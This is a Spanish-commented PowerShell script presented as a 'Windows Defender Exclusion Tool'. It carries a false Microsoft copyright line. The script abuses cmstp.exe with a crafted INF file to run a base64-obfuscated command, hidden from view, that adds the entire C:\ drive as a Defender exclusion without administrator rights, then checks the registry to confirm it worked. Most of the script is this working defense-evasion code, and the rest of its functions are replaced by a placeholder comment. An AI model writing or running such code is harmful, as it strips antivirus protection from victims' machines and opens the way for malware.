<#
.SYNOPSIS
   Windows Defender Exclusion Tool (Sin Admin)
   © Microsoft 2024 - Técnicas No Documentadas
#>

function Defender {
    param(
        [Parameter(ParameterSetName='Interface')][switch]$Add,
        [Parameter(ParameterSetName='Interface')][switch]$Exclusions,
        [Parameter(ParameterSetName='Interface')][switch]$GetAV,
        [Parameter(ParameterSetName='Interface')][switch]$User,
        [Parameter(ParameterSetName='Interface')][switch]$Admin,
        [Parameter(ParameterSetName='Extra')][switch]$Run,
        [Parameter(ParameterSetName='Extra',Mandatory=$true)][string]$FilePath,
        [Parameter(ParameterSetName='Extraa')][string]$Url,
        [Parameter(ParameterSetName='Extraa',Mandatory=$true)][string]$Out
    )

    # --- CÓDIGO ORIGINAL (IGUAL) ---
    $InfData = @'
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
REPLACE
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection,7
[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE","ProfileInstallPath","%UnexpectedError%",""
[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
'@

    $B64Command = "LgAoACIAQQBkAGQALQBNACIAIAArACAAIgBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIgApACAA" +
                  "LQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAQwA6AFwAOwAgACgARwBlAHQALQBDAGkA" +
                  "bQBJAG4AcwB0AGEAbgBjAGUAIAAtAE4AYQBtAGUAcwBwAGEAYwBlACAAcgBvAG8AdAAvAG0A" +
                  "aQBjAHIAbwBzAG8AZgB0AC8AdwBpAG4AZABvAHcAcwAvAGQAZQBmAGUAbgBkAGUAcgAgACAA" +
                  "LQBDAGwAYQBzAHMATgBhAG0AZQAgAE0AUwBGAFQAXwBNAHAAUAByAGUAZgBlAHIAZQBuAGMA" +
                  "ZQApAC4ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgADIAPgAmADEAIAA+ACAAIgAkAGUA" +
                  "bgB2ADoAcAB1AGIAbABpAGMAXABcAEUAeABjAGwAdQBzAGkAbwBuAHMAIgA="

    # --- PARTE CRÍTICA REPARADA ---
    if ($Add) {
        try {
            # 1. Crear archivo .inf temporal
            $tempFile = "$env:TEMP\cmstp_$((Get-Date).Ticks).inf"
            $InfData.Replace("REPLACE", ".('iex') `"$B64Command`"") | Out-File $tempFile -Force

            # 2. Ejecutar cmstp.exe correctamente
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "cmstp.exe"
            $psi.Arguments = "/au `"$tempFile`""
            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $psi.CreateNoWindow = $true
            $process = [System.Diagnostics.Process]::Start($psi)
            $process.WaitForExit(5000)

            # 3. VERIFICACIÓN OPTIMIZADA (SIN ERRORES)
            $regPath = "HKCU:\Software\Microsoft\Windows Defender\Exclusions\Paths"
            $exclusionFound = $false
            
            # Método principal de verificación
            try {
                $regValues = Get-ItemProperty -Path $regPath -ErrorAction Stop
                $regValues.PSObject.Properties | ForEach-Object {
                    if ($_.Name -eq "C_" -and $_.Value -eq 0) {
                        $exclusionFound = $true
                    }
                    elseif ($_.Name -eq "C:\" -and $_.Value -eq 0) {
                        $exclusionFound = $true
                    }
                }
            } catch { }

            # Método alternativo si falla el principal
            if (-not $exclusionFound) {
                $manualCheck = Get-ChildItem $regPath -ErrorAction SilentlyContinue | 
                    Where-Object { $_.GetValue("") -eq 0 -or $_.GetValue("") -eq "C:\" }
                $exclusionFound = [bool]$manualCheck
            }

            # Mostrar resultados
            if ($exclusionFound) {
                Write-Host "[✔] ¡EXCLUSIÓN ACTIVA! (C:\ está excluida)" -ForegroundColor Green
            } else {
                Write-Host "[!] Ejecutado pero no verificado automáticamente" -ForegroundColor Yellow
                Write-Host "    Verifica manualmente con:" -ForegroundColor Gray
                Write-Host "    Get-ChildItem '$regPath' | Select-Object -Property Name,Value" -ForegroundColor Cyan
            }

            # Limpieza
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "[✘] Error en el proceso: $($_.Exception.Message)" -ForegroundColor Red
        }
    }

    # ... (Resto de tus funciones originales: Exclusions, GetAV, User, Admin, Run, etc.)
}

# --- Ejecutar si se llama directamente ---
if ($MyInvocation.InvocationName -ne '.') {
    Defender @PSBoundParameters
}
